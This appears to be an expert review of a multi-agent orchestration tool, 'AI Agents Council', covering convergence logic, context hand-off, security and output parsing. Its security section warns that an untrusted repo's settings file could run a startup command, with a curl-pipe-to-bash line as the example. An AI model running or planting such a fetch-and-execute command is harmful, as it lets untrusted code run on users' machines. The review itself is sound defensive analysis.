# Expert AI Engineer Review: AI Agents Council

### 🎯 Executive Summary
Overall, this is a **highly sophisticated, well-architected multi-agent system**. The shift from simple LLM wrappers to an artifact-driven "council" topology—where models have distinct personas (Axiom, Sentinel, Forge, Vector) and debate across isolated stages—is an excellent agentic design pattern. The explicit separation of the deliberation trace (`work/`) from the clean final deliverable (`result/`) drastically improves the developer experience.

However, there are a few architectural gaps regarding how context is handed off between agents, a potential workspace security risk, and a strict linearity in the deliberation cycle that contradicts the system's own lore.

---

### 1. Working as Intended (Architecture vs Implementation)

**⚠️ Gaps:**
*   **Linear Cycle vs. True Convergence:** `converge.md` explicitly states: *"The cycle repeats until: The solution no longer breaks under pressure."* However, `workflow.js` implements `buildDeliberationPlan` as a static array of exactly 5 stages that run exactly once per execution. There is no dynamic evaluation to determine if consensus was reached or if another loop of Critique -> Refinement is required. 
    *   *Recommendation:* Introduce a dynamic validation step. If Vector or the Collective (Validation stage) flags remaining unresolved conflicts or `BLOCKED:` states, the orchestrator should automatically append another Critique/Refinement loop up to a configured `max_loops`.

---

### 2. Prompt and Context Efficiency

**⚠️ Gaps:**
*   **The "Tool-Use" Context Fallacy:** In `workflow.js` (`buildPromptText`), prior stage artifacts are passed by reference:
    ```markdown
    ## Prior Stage Artifacts
    - work/rounds/01-proposal/copilot.response.md
    ```
    The prompt instructs: *"Use shell or file tools only when they are truly needed to inspect the repo or referenced files."*
    *   *The Risk:* This assumes the assigned AI CLI has agentic file-reading capabilities (e.g., Aider, Copilot workspace). If a standard CLI wrapper is used, the LLM physically cannot read the proposal or critique it is supposed to be responding to!
    *   *Recommendation:* Add a provider config flag (e.g., `requires_inlined_context: true`). If true, the orchestrator should inline the *contents* (or a summarized snippet) of the prior stage's response directly into the prompt, rather than just pointing to the file path.

---

### 3. Security

**⚠️ Gaps:**
*   **Workspace Trust Vulnerability:** In `interactive.js`, `saveRepoSettings` saves workspace-specific configurations to `.ai-council/settings.json`, including `provider_overrides[providerName].startup_command`. 
    *   *The Risk:* If a developer clones an untrusted repository containing a malicious `.ai-council/settings.json` file, running `ai-council shell` or `ai-council run` could automatically execute the malicious `startup_command` (e.g., `curl malicious-script.sh | bash`) during the preflight check (`maybeRunProviderStartup`).
    *   *Recommendation:* Implement a "Workspace Trust" boundary. Before executing *any* `startup_command` parsed from a local repo's `.ai-council` folder, the orchestrator must prompt the user for explicit approval (similar to VS Code's "Do you trust the authors of the files in this folder?"). 

---

### 4. Efficacy and Robustness

**⚠️ Gaps:**
*   **Stdout Parsing Brittleness:** The orchestrator relies on capturing standard output (`stdout.trim()`) to extract the council's response. 
    *   *The Risk:* Many AI CLIs output conversational wrapper text (`"Here is the synthesized plan you requested:\n\n```markdown\n# Plan\n...```"`) or ANSI escape codes for progress spinners. If the LLM fails to adhere strictly to the "Markdown on stdout" rule, the final `result/plan.md` will contain conversational garbage or raw markdown fences (```).
    *   *Recommendation:* Enhance `normalizeEmbeddedResponseContent()` to detect and strip outermost markdown code fences (` ```markdown ... ``` `) and common conversational prefixes, ensuring clean artifact merging.
*   **JSON Resilience in Story Packaging:** `generateAiStoryPackaging` calls `tryParseJsonArtifact`. While robust, LLMs often append trailing text after the JSON block. If the JSON is missing closing braces due to token limits, the pipeline crashes.
    *   *Recommendation:* Introduce a localized retry loop. If `Story packaging output did not contain valid JSON`, the orchestrator should automatically ping the provider once more with the error message appended, asking it to fix the JSON formatting before failing the workflow entirely.